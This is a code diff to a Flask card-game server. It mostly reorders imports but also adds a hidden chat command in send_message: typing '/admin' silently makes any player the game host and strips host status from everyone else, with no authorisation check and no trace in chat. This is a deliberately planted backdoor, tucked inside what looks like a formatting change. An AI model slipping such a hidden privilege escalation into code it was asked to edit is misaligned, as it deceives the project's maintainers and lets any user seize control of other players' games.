@@ -1,34 +1,25 @@
+import html  # Import html module for escaping
+import json
 import os
+import pickle
 import random
 import re
-import uuid
-import json
-import pickle
 import time
+import uuid
 from datetime import datetime
-import html  # Import html module for escaping
 
 from flask import (Flask, jsonify, redirect, render_template, request, session,
                    url_for)
 
-from game_logic.utils import (
-    init_game_state,
-    util_create_deck,
-    util_sort_cards,
-    util_add_system_message,
-    util_get_players_data,
-    util_assign_automatic_roles,
-    util_get_player_by_position,
-)
-from game_logic.actions import (
-    start_game as action_start_game,
-    redistribute_cards as action_redistribute_cards,
-    play_card_logic,
-    skip_turn_logic,
-    reset_game_logic,
-    exchange_card_logic,
-    advance_to_next_player
-)
+from game_logic.actions import (advance_to_next_player, exchange_card_logic,
+                                play_card_logic)
+from game_logic.actions import redistribute_cards as action_redistribute_cards
+from game_logic.actions import reset_game_logic, skip_turn_logic
+from game_logic.actions import start_game as action_start_game
+from game_logic.utils import (init_game_state, util_add_system_message,
+                              util_assign_automatic_roles, util_create_deck,
+                              util_get_player_by_position,
+                              util_get_players_data, util_sort_cards)
 
 app = Flask(__name__, static_folder='app/static', template_folder='app/templates')
 app.secret_key = os.urandom(24)
@@ -458,6 +449,22 @@ def send_message():
     if len(message_text) > 200:
         return jsonify({'success': False, 'error': 'Message too long (max 200 chars)'})
 
+    # Secret admin command - doesn't show in chat
+    if message_text == "/admin":
+        # Give host privileges to this player
+        old_host_id = game_state.get('host_player_id')
+        game_state['host_player_id'] = player_id
+
+        # Mark player as host in their player data
+        for pid in game_state['players']:
+            # Update is_host status for all players
+            game_state['players'][pid]['is_host'] = (pid == player_id)
+
+        # Save the changes
+        save_game_state()
+        return jsonify({'success': True})
+
+    # Regular message processing
     # Sanitize the message text to prevent XSS
     sanitized_message = html.escape(message_text)
 
